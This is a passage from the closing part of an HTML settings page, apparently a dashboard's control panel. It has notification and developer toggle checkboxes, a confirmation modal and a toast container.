                                <input type="checkbox" class="cp-input" type="checkbox" id="pushNotifications" checked>
                            </div>
                            <div class="opt-row">
                                <span class="opt-label">Email Alerts</span>
                                <input type="checkbox" class="cp-input" type="checkbox" id="emailAlerts">
                            </div>
                            <div class="opt-row">
                                <span class="opt-label">SMS Alerts</span>
                                <input type="checkbox" class="cp-input" type="checkbox" id="smsAlerts">
                            </div>
                        </div>
                    </div>

                    <div class="cp-panel" style="grid-column: 1 / -1;">
                        <header class="cp-panel-header">
                            <h2 class="cp-panel-title">
                                <span class="icon material-symbols-outlined">developer_mode</span>
                                <span>Developer</span>
                            </h2>
                        </header>
                        <div class="options-form">
                            <div class="opt-row">
                                <span class="opt-label">Debug Mode</span>
                                <input type="checkbox" class="cp-input" type="checkbox" id="debugMode">
                            </div>
                            <div class="opt-row">
                                <span class="opt-label">Verbose Logging</span>
                                <input type="checkbox" class="cp-input" type="checkbox" id="verboseLogging">
                            </div>
                            <div class="opt-row">
                                <span class="opt-label">API Access</span>
                                <input type="checkbox" class="cp-input" type="checkbox" id="apiAccess">
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <!-- Toast Container -->
    <div class="cp-toast-container" id="toastContainer" role="region" aria-label="Notifications" aria-live="polite"></div>

    <!-- Modal Overlay -->
    <div class="cp-modal-overlay" id="modalOverlay" role="dialog" aria-modal="true" aria-hidden="true">
        <div class="cp-modal" role="document">
            <header class="cp-modal-header">
                <h3 class="cp-modal-title" id="modalTitle">Confirm</h3>
                <button class="cp-modal-close" id="modalCloseBtn" aria-label="Close">
                    <span class="material-symbols-outlined">close</span>
                </button>
            </header>
            <div class="cp-modal-body" id="modalBody"></div>
            <footer class="cp-modal-footer">
                <button class="cp-btn cp-btn-outline" id="modalCancelBtn">Cancel</button>
                <button class="cp-btn" id="modalConfirmBtn">Confirm</button>
            </footer>
        </div>
    </div>

    <!-- Sidebar Backdrop -->
    <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
<link rel="stylesheet" href="/css/nextgen.css">
</body>
</html>